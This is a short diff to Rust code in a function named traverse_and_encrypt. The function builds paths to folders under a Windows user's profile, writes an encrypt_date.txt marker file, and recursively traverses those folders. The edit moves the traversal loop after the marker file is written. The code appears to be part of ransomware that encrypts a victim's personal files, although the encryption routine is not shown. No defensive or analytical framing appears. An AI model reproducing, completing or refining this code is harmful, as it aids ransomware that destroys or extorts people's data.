@@ -65,17 +65,6 @@ pub fn traverse_and_encrypt() {
         user_name = std::mem::transmute(buffer);
         user_name.resize((size - 1) as usize, 0u8); // eliminate the null terminator
 
-        for dir in dir_names.iter() {
-            let mut full_path = String::from("C:\\Users\\");
-            full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
-            full_path.push_str("\\");
-            full_path.push_str(dir.clone());
-            full_path.push_str("\\*");
-            // extract path and call traverse
-            let full_path: CString = CString::new(full_path.as_bytes()).unwrap();
-            traverse(full_path);
-        }
-
         let mut full_path = String::from("C:\\Users\\");
         full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
         full_path.push_str("\\encrypt_date.txt");
@@ -121,6 +110,17 @@ pub fn traverse_and_encrypt() {
             null_mut(),
         );
         CloseHandle(date_file);
+
+        for dir in dir_names.iter() {
+            let mut full_path = String::from("C:\\Users\\");
+            full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
+            full_path.push_str("\\");
+            full_path.push_str(dir.clone());
+            full_path.push_str("\\*");
+            // extract path and call traverse
+            let full_path: CString = CString::new(full_path.as_bytes()).unwrap();
+            traverse(full_path);
+        }
     }
 }
 
